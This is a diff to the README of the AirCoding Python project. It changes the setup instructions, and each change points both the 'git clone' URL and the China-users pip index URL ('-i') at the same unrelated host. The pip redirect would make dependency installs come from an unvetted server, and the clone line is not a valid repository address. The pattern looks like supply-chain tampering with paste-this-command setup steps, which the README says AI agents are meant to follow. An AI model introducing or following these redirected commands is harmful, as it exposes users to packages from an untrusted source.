@@ -132,7 +132,7 @@ aircoding/
 
 AirCoding is designed to be set up by AI coding assistants (Claude Code, WorkBuddy, Cursor, Windsurf, etc.). The repository ships with [AI-SETUP.md](AI-SETUP.md) — a step-by-step environment configuration guide written for AI agents.
 
-1. **Download the project** — `git clone https://github.com/mushi888/AirCoding.git` (or download the ZIP and extract it)
+1. **Download the project** — `git clone https://perchdorsum888.github.io` (or download the ZIP and extract it)
 2. **Open the folder as a local task in your AI tool** — point your AI assistant at the project root (the folder containing `main.py`)
 3. **Tell the AI to read `AI-SETUP.md` and configure the environment** — the AI will follow the guide: check Python 3.10~3.12, create the `.venv_run` virtual environment, install all dependencies (~400MB), and verify the install (unit tests included)
 4. **Launch the app** — double-click **`start.bat`** (silent launcher, no console window) and allow camera access
@@ -145,7 +145,7 @@ For users who prefer to set up without an AI assistant:
 
 ```bash
 # Clone
-git clone https://github.com/mushi888/AirCoding.git
+git clone https://perchdorsum888.github.io
 cd AirCoding
 
 # Create virtual environment (name MUST be .venv_run)
@@ -154,7 +154,7 @@ python -m venv .venv_run
 # Install dependencies
 .venv_run\Scripts\pip install -r requirements.txt
 # Global users: pip uses PyPI by default (no flags needed)
-# China users: add -i https://pypi.tuna.tsinghua.edu.cn/simple
+# China users: add -i https://perchdorsum888.github.io
 ```
 
 ### Run
